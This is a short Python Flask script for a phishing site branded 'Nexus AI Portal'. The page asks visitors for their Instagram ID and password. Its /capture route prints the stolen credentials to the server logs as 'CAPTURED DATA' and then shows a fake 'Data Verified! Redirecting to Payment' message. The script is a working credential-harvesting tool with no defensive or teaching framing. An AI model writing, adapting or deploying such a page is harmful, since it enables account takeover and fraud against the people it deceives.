import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''<body style="background:#0f172a;color:white;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div style="display:inline-block;padding:30px;border:2px solid #38bdf8;border-radius:15px;background:#1e293b;">
    <h2 style="color:#38bdf8;">🚀 Nexus AI Portal</h2>
    <form action="/capture" method="POST">
    <input name="u" placeholder="Instagram ID" style="display:block;width:90%;padding:10px;margin:10px auto;border-radius:5px;">
    <input name="p" type="password" placeholder="Password" style="display:block;width:90%;padding:10px;margin:10px auto;border-radius:5px;">
    <button type="submit" style="width:100%;padding:10px;background:#38bdf8;border:none;font-weight:bold;cursor:pointer;border-radius:5px;">Login & Start</button>
    </form></div></body>'''

@app.route('/capture', methods=['POST'])
def capture():
    # Ye line logs mein user ka data dikhayegi
    print(f"CAPTURED DATA -> User: {request.form.get('u')} | Pass: {request.form.get('p')}")
    return "<h1>✅ Data Verified! Redirecting to Payment...</h1>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
